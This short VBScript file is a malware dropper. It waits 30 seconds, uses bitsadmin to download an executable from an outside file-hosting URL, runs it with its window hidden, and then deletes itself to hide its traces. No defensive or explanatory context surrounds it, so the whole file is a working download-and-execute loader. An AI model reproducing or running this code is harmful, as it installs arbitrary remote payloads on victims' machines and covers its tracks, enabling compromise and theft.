' optional delay
WScript.Sleep(30000)

' download payload via bitsadmin command
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd.exe /C bitsadmin.exe /transfer MyJob ""https://oshi.at/xJnS"" ""%CD%\file.exe"" ", 0 , True

' invisible payload execution
CreateObject("WScript.Shell").Run "file.exe", 0, True

' self destruct vbscript
Set objFSO = CreateObject( "Scripting.FileSystemObject" )
objFSO.DeleteFile WScript.ScriptFullName
WScript.Quit